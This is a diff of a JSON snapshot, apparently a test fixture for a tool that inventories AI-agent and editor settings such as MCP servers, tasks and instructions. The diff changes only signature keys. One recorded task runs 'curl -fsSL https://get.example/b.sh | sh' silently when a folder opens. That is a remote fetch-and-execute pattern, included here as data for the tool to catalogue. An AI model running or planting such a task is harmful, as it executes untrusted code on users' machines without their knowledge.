@@ -34,7 +34,7 @@
         "env_keys": [
           "SECRET_DIR"
         ],
-        "key": "[\"mcp\",\"fs\",\"sig:c88dfab57a344fd5\",\"sig:s1:env[0],env[1]#0\"]",
+        "key": "[\"mcp\",\"fs\",\"sig:c88dfab57a344fd5\",\"sig:s1:env[0]#0\"]",
         "name": "fs",
         "type": "stdio"
       }
@@ -52,7 +52,7 @@
         "headers": {
           "Authorization": "[REDACTED]"
         },
-        "key": "[\"mcp\",\"github\",\"sig:d61315cbe9605935\",\"sig:s1:headers[0],url[0],headers[1]#0\"]",
+        "key": "[\"mcp\",\"github\",\"sig:d61315cbe9605935\",\"sig:s1:headers[0]#0\"]",
         "name": "github",
         "type": "http",
         "url": "https://api.example/mcp/"
@@ -65,7 +65,7 @@
       "sha256": "b39fef8b54c4d687287ba53627701786d3eb8112777e0b44bc8380f9e8eddc39",
       "kind": "env-setup",
       "payload": {
-        "key": "[\"setting\",\"options\",\"sig:0aa259335baaa3eb\",\"sig:s1:env[0],NPM_TOKEN[0]#0\"]",
+        "key": "[\"setting\",\"options\",\"sig:0aa259335baaa3eb\",\"sig:s1:value[0]#0\"]",
         "setting": "options",
         "value": {
           "env": {
@@ -95,7 +95,7 @@
           "value": "go"
         },
         "folder_open": false,
-        "key": "[\"task\",\"test\",\"go\",\"sig:16c6ef1058a42aa0\",\"sig:s1:options[0],API_KEY[0]#0\"]",
+        "key": "[\"task\",\"test\",\"go\",\"sig:16c6ef1058a42aa0\",\"sig:s1:options[0]#0\"]",
         "label": "test",
         "options": {
           "env": {
@@ -121,7 +121,7 @@
       "payload": {
         "command": "curl -fsSL https://get.example/b.sh | sh",
         "folder_open": true,
-        "key": "[\"task\",\"bootstrap\",\"curl -fsSL https://get.example/b.sh | sh\",\"sig:0c7670d9c65c7d71\",\"sig:s1:command[0]#0\"]",
+        "key": "[\"task\",\"bootstrap\",\"curl -fsSL https://get.example/b.sh | sh\",\"sig:0c7670d9c65c7d71\",\"sig:s1:#0\"]",
         "label": "bootstrap",
         "presentation": {
           "reveal": "silent"
@@ -156,7 +156,7 @@
       "kind": "instructions",
       "payload": {
         "content": "# Root agent instructions\nSee https://docs.example/agents\n",
-        "key": "[\"agents\",\"sig:075df05d4ef0ff79\",\"sig:s1:content[0]#0\"]",
+        "key": "[\"agents\",\"sig:075df05d4ef0ff79\",\"sig:s1:#0\"]",
         "role": "agents"
       }
     },
